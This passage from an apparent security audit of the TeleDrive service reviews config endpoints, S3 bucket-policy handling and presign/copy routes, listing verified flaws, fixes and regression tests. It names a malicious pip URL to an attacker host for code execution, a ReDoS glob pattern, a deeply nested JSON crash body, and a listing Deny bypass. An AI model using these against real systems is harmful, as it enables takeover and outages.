Fix: make the settings document unable to change the bootstrap database URL through this endpoint (or require current password + explicit confirmation + a distinct admin-only principal), and never create the default admin as part of a settings save.
  - [critical] **GET leaks live Telegram credentials because redaction is a two-key denylist.** `_redacted_config` masks only `telegram.api_hash`, `telegram.accounts[*].api_hash` and `state.database_url` (web/app.py:818-831). It returns `storage.apis[*].api_hash` and `storage.apis[*].session_string` verbatim, and those entries are a supported credential source (`teledrive/storage/user_mode.py:156-192`, used when `telegram_sessions` is empty). Verified: a document containing `storage.apis[0].session_string = "SESSION_STRING_CREDENTIAL"` is returned unchanged by `_redacted_config`. A `viewer` session — or any key with `get:/api/v1/config` — therefore gets a StringSession that grants full control of the bound Telegram account (and its storage channel), plus `api_hash`. The same denylist gap covers any credential embedded in `state.db_extra_packages` (pip requirements may carry `user:token@` URLs) and discloses `storage.s3_master_key_file`, `paths.*`, `logging.log_path` (paths, low). Fix: redact by key pattern/allowlist (anything named `*secret*`, `*token*`, `*api_hash*`, `*session_string*`, `*password*`, plus URLs), and extend `_restore_secrets` symmetrically or the UI round-trip will wipe the credentials.
  - [high] **A save can persist a document the loader cannot consume, report 400, and leave the service unbootable — with no file-based recovery.** Validation stops at `uploader.validate_config`; section types are checked only later inside `_reload_service_settings` (`_section` at teledrive/settings.py:55-61). By then the file is replaced and the SQL row is written (web/app.py:930-934), and the raised `ValueError` is converted to 400 (1854-1857). Verified: PUT `{"web": "not-a-dict", ...}` → 400 `"Invalid web configuration section"`, yet `config.yaml` **and** the SQL document both hold `web: "not-a-dict"`; a subsequent `_reload_service_settings()` (the first call in lifespan, web/app.py:1137) raises the same error, so the service will not start. Because `read_raw_config` prefers the SQL document (774-802), replacing `config.yaml` with a clean copy does not help; recovery needs direct SQL access (or the master key) to clear `service_settings`. Fix: validate the *complete* typed document (`load_settings`) on the temp file before `os.replace`, and make the reload failure roll back / refuse to persist.
  - [high] **`state.db_extra_packages` is an unauthenticated code-execution persistence primitive for a config writer.** The list is stored with no allowlist or hash pinning (teledrive/settings.py:108-119) and installed with `pip install --target` on every start (web/app.py:1177-1179, settings.py:209-235) as the service user, from PyPI or an arbitrary URL requirement. A key scoped only to `put:/api/v1/config` can add `evilpkg @ https://attacker/…` and get code execution at the next restart (execution point confirmed in code; actual RCE **unverified** because it requires a restart and network access). The same field is returned by GET, so private-index credentials embedded in requirement URLs also leak (see the critical redaction finding).
  - [high] **`jobs.watch` + roots let a config writer queue arbitrary readable files for upload to Telegram.** `jobs.watch_bucket`, `jobs.watch`, `jobs.source_root`, `upload.source_dir` and `paths.source_roots` are all PUT-controlled and live-reloaded (web/app.py:141-153, 1090-1124). `folder_watch_scan` resolves `cfg.source_dir`, checks only that it is inside `JOB_SOURCE_ROOT`, and enqueues up to 100 files per pass into an existing bucket (`teledrive/storage/legacy_bridge.py:30-85`); the durable scheduler then uploads them (`run_next`, jobs.py:410+). Setting `source_dir`/`source_root` to `/data` (already inside the default root) in one save, `watch: true`, and any existing bucket name is enough; widening to `/` needs a second save because validation reads the *previous* environment roots. The writer need not hold any storage or job permission to cause the upload. (Bucket must already exist and Telegram must be configured — **partially unverified** end-to-end.)
  - [medium] **It is a whole-document replace with no schema, so unknown keys/types are stored and omissions delete data.** Unknown keys are persisted, mirrored to the file and returned by GET (read path does not filter: web/app.py:774-802, 861-893), while omission of `telegram.api_hash`, `telegram.accounts[*].api_hash` or `storage.apis` silently erases them — `_restore_secrets` only restores values that are literally `__REDACTED__` (web/app.py:76, 838-850). A client that PUTs a partial document (there is no PATCH) wipes every other setting; defaults then silently apply (`/uploads`, `sqlite:////data/state.db`, host list). Combined with the 400-after-write behaviour, a caller cannot tell whether its document was applied.
  - [medium] **The self-healing write to the bootstrap file is not atomic and can destroy the only pointer to the SQL document.** `effective_config` rewrites `CONFIG_PATH` in place with `_secure_write`, i.e. `O_TRUNC` on the final path (web/app.py:884-886, 284-292), not temp+rename. A crash mid-write leaves a truncated/empty YAML file; `_settings_store` reads that file to learn `state.database_url` (746-768), so the authoritative SQL document becomes unreachable and startup fails (`_reload_service_settings` → `load_config`) even though the data is intact. This write also happens during ordinary reads (any cache miss with a stale mounted file) and races with saves. Fix: `.tmp` + `os.replace` here too, and keep a last-known-good URL in the environment.
  - [medium] **All config writers share one predictable temp path and there is no lock, so validation can apply to a different document than the one installed.** `validate_and_write_config`, `set_storage_strategy` and `set_replication_account` all use `CONFIG_PATH.with_suffix(suffix + ".tmp")` (web/app.py:917-930, 3209-3211, 3263-3265). Two concurrent saves can have one request read/validate a temp file another request just wrote, then `os.replace` it while persisting its own unvalidated `merged` document to SQL; the loser can also see `FileNotFoundError` from `os.replace` after its file was already consumed. Interleaving is code-derived (**unverified**), but the shared path and absence of any file lock/compare-and-swap are plain. The last writer wins in the DB and the next `effective_config` heals the file from SQL, so the final state is the last DB persist — which may not be the state that passed validation.
  - [medium] **A failed SQL persist is swallowed after the file write, so the API reports success and the change is then silently reverted.** `_persist_settings_document` catches everything (web/app.py:899-910) and `put_config` still returns 200. On the next cache miss, `effective_config` compares the (authoritative) SQL document with the file it just wrote, finds them different, and overwrites the file with the old SQL document (884-886) — the save evaporates with no operator-visible error. This also means a save that tightens `auth_failure_limit`/`allowed_hosts` can silently not apply.
  - [medium] **Security-relevant live globals change with no confirmation and no session/cache invalidation.** `web.allowed_hosts` is the anti-DNS-rebinding check applied per request (web/app.py:1261-1268) and is replaced from the submitted document; `auth_failure_limit`/`auth_failure_window_seconds` (389-409), `JOB_AUTO_RUN`, `WATCH_*` and the exported filesystem roots change the same way. Nothing invalidates `AUTH_FAILURES`, `_DEFAULT_ADMIN_PW_CACHE` (357-386) or any existing session when the DB/host policy changes, and there is no second confirmation for the subset of keys that re-point storage or persistence. A writer who can only touch config gets powers the role model otherwise reserves for admin/owner surfaces.
  - [low] **No audit trail of what changed, and the log line omits the actor.** The handler writes `"settings save requested"` / `"settings saved successfully"` with `_log`'s default `user="system"` (web/app.py:1848-1853, 233-237); the only actor record is the last `updated_by` column, overwritten on each save (settings_store.py:99-105), with no before/after diff, timestamp history or old-value snapshot. The generic HTTP audit middleware records the path and principal but no body. There is also no diff redaction concern today only because no diff exists. Fix: write one structured audit row (actor, changed key paths, old→new for non-secret keys, `"***"` for secret keys) before/with the persist; never include secret values.
  - [low] **No bound on the document before it hits disk.** The 1 MiB limit is enforced inside `SettingsStore.save` (settings_store.py:90-92) *after* `os.replace` of the YAML file (web/app.py:930-934); an oversized body up to `MAX_REQUEST_BYTES` is written permanently and the resulting `ValueError` is swallowed by `_persist_settings_document`. A failed reload of a large file also slows every later read.
  - [low] **Adjacent config writers bypass the SQL document and will be reverted.** `set_storage_strategy` (3193-3215) and `set_replication_account` (3240-3270) write the file, call `_reload_service_settings`, and neither persist to SQL nor clear `_CONFIG_CACHE`; the next `effective_config` sees SQL ≠ file and overwrites the file with the SQL document, undoing the change. Their success responses and `"(runtime reloaded)"` logs are therefore false whenever the SQL row exists. Out of the strict endpoint pair, but it is the same store and the same temp path.
  - [low] **Redacting the database URL mangles SQLite paths, so GET reports a URL that is not the configured one.** `redact_database_url` rebuilds the URL with `urlunsplit` after `make_url(...).render_as_string()` (teledrive/db.py:231-243). Verified: `sqlite:////data/state.db` is returned as `sqlite://data/state.db` and `sqlite:///data/state.db` as `sqlite:/data/state.db`; Postgres URLs also change scheme (`postgresql://` → `postgresql+psycopg://`). The redaction is deterministic, so the `_restore_secrets` exact-string comparison (web/app.py:855-857) still round-trips — but any client that normalizes or re-enters the displayed value produces a *different* URL (for the second form, a relative path resolved against the config directory), which is accepted as a new database and triggers the redirect/default-admin chain above. A user copying the value to provision another instance gets a broken path. Fix: redact only the userinfo/query components of the original string (or return the original when there is no password/query secret) and round-trip-tag it with the original value.
  - [nit] `_SETTINGS_CACHE` is written on every read (web/app.py:771, 800-801) and never read anywhere; the `"generation"` field suggests an intended cache that does not exist. Two extra DB connections + `ensure_schema` run per `GET /api/v1/config` (`read_raw_config` → `_settings_store` → `SettingsStore.__init__`), which is unnecessary read-path cost and DDL on a GET.
  - **Verified sound (no finding):** `_redacted_config` correctly masks `telegram.api_hash`, nested account hashes, DB-URL passwords and sensitive query parameters (test coverage in tests/web/test_security.py:26-46; query/userinfo handling in teledrive/db.py:231-243); PUT error text passes through `_scrub_text` so a rejected connection does not echo credentials; the save path is temp+`os.replace` with mode 0600 and `O_NOFOLLOW`, and `ensure_config` refuses a symlinked config (web/app.py:284-292, 685-720); the SQL document is encrypted with the S3 master key (settings_store.py:59-84) and falls back to the file when undecryptable; `_drop_retired_auth_settings` strips the upgrade-era `web.password` (734-743); CSRF + same-origin is required on PUT for cookie principals (300-312).
- **Tests that should exist:**
  - `test_config_save_cannot_redirect_database_and_seed_admin` — start with DB A, save a document whose `state.database_url` names a fresh SQLite file B; assert the save is rejected (or requires a distinct confirmation), that `config.yaml` and the SQL row still name A, that B was not created/seeded, and that no `admin` row with a hash accepting `"admin"` exists in B **(mandatory regression; verified failing today — the probe created B with `admin`/`admin`)**.
  - `test_get_config_redacts_storage_api_credentials` — seed `storage.apis[0]` with `api_hash` and `session_string`, GET as a `viewer`, and assert neither value (nor any URL-encoded form) appears; then PUT the redacted document back and assert `_restore_secrets` restored both, so the round-trip is lossless.
  - `test_config_save_rejects_a_document_the_loader_cannot_read` — PUT `web: "not-a-dict"` (and `storage: []`, `paths: 7`); assert 400, that neither `config.yaml` nor the SQL document changed, and that a fresh `_reload_service_settings()` still succeeds.
  - `test_config_save_persists_sql_or_fails` — make `SettingsStore.save` raise; assert the HTTP status is not 200 and that `effective_config` after the call still returns the previous document (no silent revert).
  - `test_effective_config_write_is_atomic` — interrupt the self-heal write (short write / exception) and assert `config.yaml` still parses and still names the DB (currently truncated in place at web/app.py:884-886).
  - `test_concurrent_config_saves_do_not_install_unvalidated_documents` — two threads, one with a valid and one with an invalid document, many iterations; assert the final file/SQL pair is always one that passed validation and that no request returns 200 for a document that never rode through validation.
  - `test_config_save_requires_confirmation_for_dangerous_keys` — PUT each of `state.database_url`, `state.db_extra_packages`, `jobs.source_root` + `paths.source_roots`, `web.allowed_hosts` and assert the documented gate (re-auth/allowlist) fires; pin the intended contract for each.
  - `test_config_save_is_audited_without_secret_values` — assert exactly one audit record names the actor and the changed key paths, contains `***` in place of `api_hash`/`session_string`/DB password, and exists only after the persist.
  - `test_viewer_can_read_config_but_not_write` — pin the intentional asymmetry: viewer GET 200, viewer PUT 403, `put:/api/v1/config` key accepted, and document whether that key is considered equivalent to admin.
- **Verdict:** Redaction and file permissions are careful for the two keys the author remembered, but `PUT` is an unauthenticated-to-the-loader whole-document replace with no schema, no lock, no re-auth and no rollback: it can re-point the authoritative database and seed `admin`/`admin` (verified), persist a document that bricks the next boot (verified), add pip/RCE and arbitrary file-upload directives, while `GET` hands a live Telegram `session_string` to any viewer (verified) — this pair must be treated as root-equivalent and fixed before it is exposed to scoped API keys.

## bucket policy — PutBucketPolicy / GetBucketPolicy / DeleteBucketPolicy

- **Handler:** web/s3.py:1263-1293 (`_handle_bucket_controls`, selected by `is_bucket_policy` at web/s3.py:4334; action map web/s3.py:4480-4485; single authorization gate web/s3.py:4825-4830) + teledrive/s3/policy.py:254-397 (parse), 483-509 (`evaluate`), 570-665 (cache and store). Governance write surface: web/s3_governance_api.py:618-637 (`put_policy`), 640-650 (`delete_policy`), 606-615 (`get_policy`), which does not touch the catalog directly — it re-enters the S3 gateway over the loopback listener with a machine credential (web/s3_governance_api.py:363-387).
- **Auth model:** Two independent layers. (1) SigV4 scope: `verify_header_signature` (teledrive/s3/sigv4.py:392-401) calls `S3CredentialStore.resolve(access_key, permission)` (teledrive/s3/credentials.py:226-242), which requires the action to be in the credential's own permission list and the credential to be unrevoked/unexpired. Mapping GET→`s3:GetBucketPolicy`, PUT→`s3:PutBucketPolicy`, DELETE→`s3:DeleteBucketPolicy` (web/s3.py:4480-4485). (2) The same bucket-policy/ACL gate as every data request: `_authorize_resource` (web/s3.py:2782-2817) evaluates the stored policy for this action and principal, so a policy can Deny its own management, and there is no root/bucket-owner bypass. An explicit Allow does bypass the Phase D ACL for the policy actions too (web/s3.py:2813-2814). `s3:PutBucketPolicy` / `s3:DeleteBucketPolicy` / `s3:GetBucketPolicy` are in `_ABAC_CONTROL_EXEMPT` (web/s3.py:2756-2763), so the ABAC gate can never lock policy administration, but a policy Deny can — recovery is via a different credential, not a privileged bypass. The governance UI uses a *different* path: admin role for writes and operator+ for reads, plus same-origin/CSRF (web/s3_governance_api.py:99-120), then a loopback SigV4 request signed by the first active credential holding the action (or the caller-supplied `credential_id`) (web/s3_governance_api.py:311-339). Consequence, verified: the persisted `updated_by` and the S3 audit principal are the *machine* access key (`TD1457…`), never the admin username.
- **Inputs:** The document must be a JSON object with **exactly** `{Version, Statement}` (policy.py:366-369); `Version` must be `"2012-10-17"` (370-372); `Statement` must be a non-empty JSON **array** of at most 50 objects (373-378) — the AWS-legal single-object form is rejected. Each statement may contain only `Sid|Effect|Principal|Action|Resource|Condition` (257-262). `Sid` optional string ≤128 chars; non-empty Sids must be unique; two empty Sids are accepted (266-268, 383-385). `Effect` exactly `Allow` or `Deny` (263-265). `Principal` must be `{"CanonicalUser": id|[ids]}` with 1..100 entries of 1..64 chars; bare `"*"` → 501 `NotImplemented` (270-275); `AWS`/`Service`/`Federated` → 501 (276-281); every id must be an **active credential at write time**, else 400 `InvalidPrincipal` (386-391). `Action` 1..200 strings ≤128 that (a) match `s3:[A-Za-z0-9*?]+`, and (b) glob-match at least one member of `PERMISSIONS` (161-167, 297-301) — so `s3:*`, `s3:Get*`, `s3:*Object` are accepted, `s3:getobject`, `*`, `s3:` are rejected at parse time, and an action the router never emits cannot be denied. `Resource` 1..50 strings ≤1024 that start with `arn:aws:s3:::`; the bucket component must equal the target bucket **exactly**; the no-key form addresses bucket-level ops only; the key form must be non-empty, ≤1024 UTF-8 bytes, free of CR/LF/NUL, and is compiled as an IAM glob (`*`, `?`, `*` spans `/`) (170-192, 228-240). `Condition` must be a non-empty object whose operator is one of 10 allowlisted names (49-54), whose keys are only `s3:prefix`, `s3:max-keys`, `s3:delimiter`, `aws:SourceIp`, `s3:x-amz-acl`, or `<s3:ExistingObjectTag|aws:PrincipalTag>/<suffix ≤128 chars>` (59-63, 195-205), and whose values are 1..50 non-empty strings ≤1024 (140-151, 322-348); `Bool` must be true/false, `Numeric*` integers, `IpAddress`/`NotIpAddress` a valid network. Document ≤20 KiB enforced twice — streaming abort (web/s3.py:1277-1279) and parse (policy.py:118-120); JSON is parsed with duplicate-key rejection, NaN/Infinity rejection and a **depth-10 check applied after parsing** (98-137). PUT also requires a valid signed payload checksum (web/s3.py:1280 → 385-406); DELETE rejects any non-empty body (1285-1290).
- **Side effects:** `replace()` performs a no-op `UPDATE storage_buckets … created_at=created_at` as an existence/lock guard, `DELETE`+`INSERT` into `storage_bucket_policy` (`bucket` PK, canonical sorted JSON, `updated_ns=time.time_ns()`, `updated_by=<access key>`), commits, then `_POLICY_CACHE.discard_bucket` (policy.py:639-658). A row grants, for the named active credentials: any action in `PERMISSIONS` — data plane *and* control plane, including `s3:PutBucketPolicy`, `s3:PutBucketAcl`, `s3:PutObjectRetention` — on the bucket ARN (bucket-level ops) or matching keys (object ops), and an Allow skips the ACL intersection entirely (web/s3.py:2813-2814). It can never exceed the grantee credential's own scopes because SigV4 resolves those first. The decision is applied on every S3 request (web/s3.py:4825-4830) and re-checked per key for batch delete (web/s3.py:1001-1003), copy/UploadPartCopy sources (web/s3.py:2678-2691, 2542, 3368) and POST-form uploads (web/s3.py:896-904). DELETE removes the row; the cache is discarded. The document itself is stored once, in cleartext, in the catalog DB; the HTTP audit log stores the path *without* the query string, so a policy write is indistinguishable from `PUT /bucket`/CreateBucket (web/s3.py:4996-5018).
- **Failure modes:**
  - GET: 200 with the canonical JSON body; 404 `NoSuchBucketPolicy` (web/s3.py:1267-1272, 764-766); 404 `NoSuchBucket`; 403 when the credential lacks `s3:GetBucketPolicy` or a policy/ACL denies.
  - PUT: 204 on success; 400 `MalformedPolicy` for every grammar/size/bounds violation above; 400 `InvalidPrincipal` for a non-active `CanonicalUser`; 501 `NotImplemented` for wildcard/foreign principals and non-GET/PUT/DELETE methods on `?policy` (1293); 400 `BadDigest`/`XAmzContentSHA256Mismatch` for a bad checksum; 403 for scope or policy deny; 404 `NoSuchBucket`.
  - DELETE: 204 even when no policy existed; 400 `InvalidRequest` when a body is sent; same 403/404 paths.
  - **503 (not 400) for a ≤20 KiB body with ~10 000 nesting levels**: `json.loads` raises `RecursionError` before `_check_depth` runs, and `_handle` does not catch it (verified end-to-end; probe recorded `503`).
  - Read path: a stored row that no longer parses raises `PolicyError` (mapped to 400 `MalformedPolicy` for a *read*) or `KeyError` from `_compile_stored` (uncaught → 5xx), so a corrupt/hand-edited row makes the bucket unusable rather than failing closed with a clear error (policy.py:400-408).
- **Findings:**
  - [high] **An installed policy can stall the whole process: IAM globs are compiled to backtracking regexes and evaluated on the event loop.** `_glob_regex` turns every `*` into `.*` and every `?` into `.` (policy.py:154-158), and `matches_resource`/`matches_action` run `re.fullmatch` for every statement of every request (policy.py:228-240) inside `async def _handle` (web/s3.py:4196-4205, registered as an async route at 5089-5106), so evaluation happens on the single event-loop thread — web UI and every other bucket included. A policy resource of `arn:aws:s3:::b/*a*a*a*a*a*a*a*a*a*` against an object key of ~1000 `a`s plus one differing byte backtracks combinatorially: measured **>5 s for a 20-character pattern** with a 1000-byte key, and both limits are generous (resource pattern up to 1024 chars, key up to 1024 bytes per `catalog.py:153`). One `GET /b/<key>` then wedges all TeleDrive traffic indefinitely. The trust boundary is "can write a policy on any bucket", but the blast radius is the entire deployment, not that bucket. Fix: translate globs into a non-backtracking matcher (segment-wise/dynamic-programming `fullmatch`, or `fnmatch.translate`-with-`re` on a linear engine) and time-bound evaluation; at minimum cap consecutive `*`/literal runs per pattern.
  - [high] **A Deny conditioned on `s3:prefix` (and `s3:max-keys` / `s3:delimiter`) silently does not apply to a listing request that omits the parameter — verified Deny bypass.** `_policy_context` only populates these keys when the query parameter is present (web/s3.py:2704-2708), and `_condition_matches` treats an absent key as "condition false" for positive operators (policy.py:430-435), while AWS treats `s3:prefix` as present-and-empty for `ListBucket`. Verified e2e: after installing `Deny s3:ListBucket` with `StringLike {"s3:prefix": ["*"]}`, `GET /b?prefix=a` returns **403** but a bare `GET /b` returns **200** and enumerates the whole bucket. The same hole exists for `s3:delimiter` and `s3:max-keys` (defaults 1000/empty are never materialized). Fix: populate the operation's default context for `ListBucket`/`ListBucketVersions` (`s3:prefix=""`, `s3:delimiter=""`, `s3:max-keys="1000"`), not the raw query string.
  - [medium] **A missing context key satisfies a *negated* condition, including for Allow, so `s3:ExistingObjectTag`/`aws:PrincipalTag`/`NotIpAddress` can fail open.** `_condition_matches` returns `condition.negated` when the key is absent (policy.py:430-435; `negated` = `StringNotEquals`/`NotIpAddress`, 214-216). Verified: `Allow s3:GetObject` with `StringNotEquals {"s3:ExistingObjectTag/class": ["public"]}` returns `allow` for an object with **no tags at all**; `aws:SourceIp` absent (any ASGI server that reports no client) makes `Allow … NotIpAddress` unconditional. AWS documents that a missing `s3:ExistingObjectTag` makes the condition false for all operators, so this engine grants where AWS would not, and an admin who reads "allow everything not marked public" as "allow only labelled objects" gets an over-grant. Fix: evaluate tag keys as absent→false for every operator, and make `NotIpAddress`/`StringNotEquals` on request-identity keys deny-or-no-decision instead of allow.
  - [medium] **`aws:SourceIp` is the TCP peer, so IP conditions are meaningless (and fail open) behind the documented reverse proxy.** The context is `request.client.host` only, with no trust-aware `X-Forwarded-For` handling (web/s3.py:2709-2711), while `docs/REVERSE_PROXY.md` presents a same-host nginx deployment. Behind such a proxy every request is `127.0.0.1`, so `Allow` + `IpAddress aws:SourceIp <corp>` becomes an allow for the whole internet and `Deny` + `NotIpAddress` becomes a deny for everyone; an IPv4-mapped/IPv6 peer also never matches an IPv4 network (`ipaddress` version mismatch, policy.py:445-456), which turns the same Deny into a hard outage. Nothing in the policy UI warns that these conditions assume a direct listener. Fix: either refuse `IpAddress`/`NotIpAddress` unless the gateway is configured with a trusted-proxy list, or derive the key through that list and document it.
  - [medium] **Policy writes are effectively unaudited: the S3 audit line drops the query string, and the only actor recorded is the machine credential.** `_audit`/`_http_log` logs `request.url.path` only (web/s3.py:5000, 5009), so `PUT /b?policy` is byte-identical to `PUT /b` (CreateBucket) and no line says "policy changed"; the DB keeps a single `updated_by` access key that the next write overwrites (policy.py:650-652), and the governance audit records only `bytes=N` — not the principals, not a document hash, not the previous document (web/s3_governance_api.py:635-636). A grant to a third-party credential is therefore unattributable to a human. Positively, the document is **not** duplicated into any log (correct, since it can contain principal/tag structure), and the S3 body is not logged. Fix: include the subresource and a SHA-256 of the document in the audit line, log the principal set (not the document) at INFO, and append history rows instead of overwriting `updated_by`.
  - [medium] **The depth bound is enforced after parsing, so a malformed body produces a 5xx instead of `MalformedPolicy`.** `json.loads` (policy.py:126-129) recurses before `_check_depth` (134) can reject at depth 11, and `RecursionError` is not a `ValueError`, so it escapes `_load_json`, escapes the `PolicyError` handler (web/s3.py:4924) and yields 503 (verified e2e with `[`×10000 inside 20 KiB). Same class: `_compile_stored` re-parses a stored document without the Version/shape checks and can raise `KeyError` (policy.py:400-408). Fix: pre-scan the JSON with a depth-limited/streaming parser or bound `sys.setrecursionlimit` locally, and map parse-time `RecursionError` to `MalformedPolicy`.
  - [low] **A bucket policy cannot constrain the website/`public_read` path at all.** `_serve_site` authorizes purely on `website_config.enabled` + `catalog.public_read(bucket)` and never calls `_authorize_resource` (web/app.py:5882-5925), so a `Deny s3:GetObject` for every active principal leaves those objects anonymously readable while the governance page shows policy and `public_read` side by side. Since `Principal:"*"` cannot be expressed, a policy author has no way to write the matching deny. Fix: either evaluate the policy for the anonymous principal in `_serve_site`, or state in the UI that PAB/`public_read` is the only control on that surface.
  - [low] **`?policyStatus` never looks at the policy document.** `IsPublic` is computed from bucket-ACL grants and the PAB flags only (web/s3.py:1344-1359), although the surrounding comment claims it runs "the real data"; today it can only ever answer `false` because public grantees are unwritable, but the check would still say `false` if a future grammar change allowed a wildcard principal. Also, `PutBucketPolicy` never consults `BlockPublicPolicy`/`IgnorePublicAcls` (no reference in web/s3.py:1263-1293), so the PAB interaction is nominal. Fix: compute `IsPublic` from the parsed statements too, and reject a public policy when `BlockPublicPolicy` is set.
  - [low] **`s3:PutBucketPolicy` is authorization-layer authority that the UI models as ordinary configuration.** A credential holding only that scope can rewrite the policy to Deny the current administrator's credential (recovery then requires a different credential) and to Allow any *other* active credential the full action set that credential already holds, bypassing the ACL (web/s3.py:2813-2814). It cannot widen its own scopes (credentials.py:237-238), which bounds it. Verified: revocation still wins (`resolve` rejects a revoked key before evaluation, credentials.py:235; probe: 200 before revoke → 403 after, and re-writing a policy that names the revoked key is rejected 400). Recommend marking this scope owner-equivalent in the credentials UI.
  - [low] **Small grammar deviations from AWS that reject valid policies or hide mistakes:** empty-string condition values are rejected (policy.py:140-151), so the documented `StringEquals s3:prefix ""` idiom is unwritable; a single-object `Statement` is rejected (373-378); actions are case-sensitive (`s3:getobject` → 400, safe but unlike AWS); duplicate *empty* `Sid`s pass the uniqueness check (383-385) because the filter uses truthiness; an invalid-principal write returns `InvalidPrincipal` rather than AWS's `MalformedPolicy` (389-391); `arn:aws:s3:::b/../b2/x` and `arn:aws:s3:::b//x` are accepted as literal key patterns (harmless — storage keys are exact-match, `catalog.py:551-562`).
  - [low] **An oversized policy PUT aborts mid-stream and leaves the request body unread**, the exact HTTP/1.1 keep-alive hazard already acknowledged for conditional writes (web/s3.py:4906-4913): the 20 KiB guard raises while the client is still sending (1274-1279), so the error response can race an unconsumed body. Fix: drain (bounded) before replying, or set `Connection: close` like the conditional-write path.
  - [nit] `_POLICY_CACHE` is never discarded on bucket delete, but this is **not** exploitable: `delete_bucket` explicitly removes `storage_bucket_policy` (teledrive/storage/catalog.py:1420-1435), `get_compiled` requires a live row (policy.py:624-637) and the cache key includes `updated_ns`, so the orphan entry is unreachable. Verified e2e: delete an empty bucket that had a policy, recreate it → `GET ?policy` is 404. Cache correctness otherwise verified: `(bucket, updated_ns)` key, `discard_bucket` after every replace/delete (639-665), stale Deny/Allow after PUT and after DELETE both tested clean.
  - **Verified sound:** Deny wins regardless of statement order and is not short-circuited by an earlier Allow (`evaluate` scans every statement, policy.py:490-509; probe confirmed deny-then-allow and allow-then-deny both return `deny`); unknown/foreign actions are rejected at write time rather than silently matching (161-167); a policy can only address its own bucket, so no cross-bucket prefix confusion (181-185); duplicate JSON keys, NaN, non-UTF-8 and >20 KiB are rejected (98-137); principals must be live credentials at write time, public/`AWS`/`Service` principals are unwritable (270-291, 386-391), and revocation immediately stops grants (credentials.py:235); batch delete, copy sources and form uploads re-authorize per key.
- **Tests that should exist:**
  - `test_bucket_policy_deny_on_prefix_covers_bare_listing` — install `Deny s3:ListBucket` with `StringLike {"s3:prefix": ["*"]}` for the caller, upload one object, then assert **both** `GET /b` and `GET /b?prefix=a` are 403. Today the bare listing is 200 **(mandatory regression; verified failing)**.
  - `test_bucket_policy_glob_matching_is_linear` — compile a 1024-char resource pattern made of many `*a` groups and `fullmatch` it against a 1024-byte key that fails; assert the call completes under e.g. 100 ms (today: >5 s for a 20-char pattern, unbounded).
  - `test_bucket_policy_deep_json_is_malformed_policy` — PUT a ≤20 KiB body of 10 000 nested arrays; assert 400 `MalformedPolicy` and no 5xx / no traceback (today: 503).
  - `test_bucket_policy_negated_condition_on_missing_key_denies` — an object with no tags against an `Allow` using `StringNotEquals s3:ExistingObjectTag/class`; assert no `allow` (pin the intended AWS semantics), and the mirror case for `aws:SourceIp` absent with `NotIpAddress`.
  - `test_bucket_policy_deny_applies_to_every_matching_statement` — two Deny statements where the first Allow matches; assert `deny` (extends the existing single-order `test_deny_overrides_allow`).
  - `test_bucket_policy_allow_cannot_exceed_credential_scope` — a policy granting `s3:GetObject` to a credential whose permission list lacks it; assert 403 at SigV4 (policy is not an escalation of the credential's own scopes).
  - `test_bucket_policy_cache_survives_delete_and_bucket_recreate_without_revival` — already partially covered by `test_policy_roundtrip_and_delete`; add the bucket-delete/recreate leg (today it passes) and a DELETE-then-ACL-fallback read.
  - `test_bucket_policy_write_is_audited_with_subresource_and_actor` — assert the audit record for `PUT /b?policy` names the actor, the subresource and a document hash, and contains neither principals nor the document.
  - `test_bucket_policy_deny_still_covers_public_read_website` (or a documented exemption test) — pin whichever contract is chosen for `_serve_site`.
- **Verdict:** Parsing is genuinely fail-closed (strict grammar, live-principal check, per-statement evaluate, correct cache invalidation, revocation honored), but two authorization holes are real: a Deny on `s3:prefix` silently misses a bare listing (verified 200 vs 403), and a policy-supplied glob can freeze the whole process because matching is a backtracking regex on the event loop — fix both before treating bucket policies as an authorization boundary.

## presign / copy — POST /api/v1/admin/storage/buckets/{bucket}/{presign,copy}

- **Handler:** web/app.py:3895 (`admin_presign_object`) and web/app.py:4072 (`admin_copy_object`; the live route is `/objects/copy`, web/app.py:4069, not `/copy`). Signer: `presign_get_url` at teledrive/s3/sigv4.py:274. Copy engine: `copy_object` at teledrive/storage/copy.py:35.
- **Auth model:** Both are `Depends(require_auth)` (web/app.py:582-637) plus `_same_origin` (CSRF header `x-teledrive-csrf: 1` and optional same-origin check, web/app.py:300-312). Session callers pass the outer role gate (`_required_roles`, web/app.py:510-528) and the per-route permission map; bearer keys need the exact `post:/api/v1/admin/storage/buckets/{bucket}/presign` or `.../objects/copy` scope. Neither path is in the admin-only set (web/permissions.py:76-105), so **`operator` can call both**; `viewer` cannot (POST). Verified over HTTP with the `authenv` fixture: admin 200, operator 200, viewer 403; a key created with only the presign permission got 200 on presign and 403 on the content-download route. Presign is **not** gated by `_require_interactive_session` (web/app.py:5150-5174), unlike credential reveal/issue (used at web/app.py:5227), even though it delegates an S3 credential the caller may be forbidden to reveal. Neither handler consults bucket policy or bucket ACL: copy has no equivalent of the S3 copy handler's source-ACL check (`_require_source_acl`, web/s3.py:3368, 2678), and presign only checks the *credential's* `s3:GetObject` flag, not whether that credential may read this bucket/key. The real resource decision for a presigned URL happens later, online, in the S3 gateway (`_authorize_resource` with the credential access key, web/s3.py:4826-4834).
- **Inputs:** presign body is a raw `dict`: `key` (`str(...).strip()`, required, **no length or byte bound**; whitespace is silently trimmed), `expires` (`int(payload.get("expires") or 3600)`, web/app.py:3904-3907 — so `0`, `""` and `null` all become 3600, floats truncate, negative and >604800 reach the signer), `credential_id` (optional id *or* access key; `reveal` matches either, teledrive/s3/credentials.py:265-270; fallback is the newest active credential with `s3:GetObject`, web/app.py:3926-3931, ordered by `created_at DESC`, credentials.py:204-212). Copy inputs: path `bucket`; query `key` (1..1024 characters); `ObjectCopyRequest` body (`destination_bucket` optional 3..63 chars, `destination_key` 1..1024 chars, web/app.py:3673-3675). The real destination bound is 1024 UTF-8 **bytes** (`_keyhash`, teledrive/storage/catalog.py:152-155), so 600 × "é" is accepted by Pydantic and rejected later. Keys allow newlines/control characters; the source key is not stripped. Body size is capped by the global `MAX_REQUEST_BYTES` middleware.
